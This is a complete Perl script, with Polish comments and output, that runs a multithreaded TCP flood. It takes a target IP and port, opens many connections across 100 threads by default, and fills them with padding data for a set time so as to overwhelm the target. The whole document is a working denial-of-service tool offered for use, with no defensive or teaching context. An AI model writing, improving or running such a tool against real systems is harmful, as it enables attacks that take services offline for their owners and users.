#!/usr/bin/perl

use IO::Socket::INET;
use threads;
use strict;

my ($ip, $port, $size, $time, $threads) = @ARGV;
$size    ||= 4096;   # domyślny rozmiar pakietu
$time    ||= 100;    # domyślny czas w sekundach
$threads ||= 100;    # domyślna liczba wątków

my $endtime = time() + $time;

print "\e[1;32m";
print "TCP flood na $ip:$port przez $time sekund, pakiet: $size bajtów, wątki: $threads\n";
print "\e[0m";

sub flood {
    while (time() <= $endtime) {
        my $sock = IO::Socket::INET->new(
            PeerAddr => $ip,
            PeerPort => $port,
            Proto    => 'tcp',
            Timeout  => 1
        );
        if ($sock) {
            eval {
                for (1..100) { # 100 pakietów na połączenie
                    print $sock 'A' x $size;
                }
            };
            close($sock);
        }
    }
}

my @pool;
for (1..$threads) {
    push @pool, threads->create(\&flood);
}

$_->join for @pool;

print "\e[1;32mKoniec!\e[0m\n";
